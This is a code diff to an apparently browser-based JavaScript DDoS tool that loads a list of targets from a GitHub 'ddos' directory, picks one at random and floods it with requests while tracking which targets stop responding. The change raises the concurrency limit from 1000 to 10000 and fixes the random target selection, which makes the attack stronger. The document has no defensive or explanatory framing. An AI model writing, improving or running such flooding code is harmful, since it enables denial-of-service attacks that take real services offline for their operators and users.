@@ -5,12 +5,16 @@ const NO_RESPONSE_SYMBOL = "☠️";
 const targetsURL = 'https://raw.githubusercontent.com/anondevua/anondevua.github.io/main/ddos/';
 const updateInterval = 500;
 const fetchTimeout = 1000;
-const CONCURRENCY_LIMIT = 1000;
+const CONCURRENCY_LIMIT = 10000;
 const RESULTS_NUM = 10
 
 var targetStats = {}
 var statsEl = document.getElementById('stats');
 var descEl = document.getElementById('description');
+
+function getRandomInt(max) {
+    return Math.floor(Math.random() * max);
+}
 
 function printStats() {
     for (var [target, stats] of Object.entries(targetStats)) {
@@ -79,7 +83,8 @@ async function flood(target) {
 
 fetch(targetsURL + "targets.json").then((t) => {
     t.json().then((j) => {
-        var rand = Math.random() % j.length;
+        rand = getRandomInt(j.length);
+        console.log(rand);
         descEl.innerHTML = j[rand]["description"];
         fetch(targetsURL + j[rand]['name'] + ".txt").then((r) => {
             r.text().then((d) => {
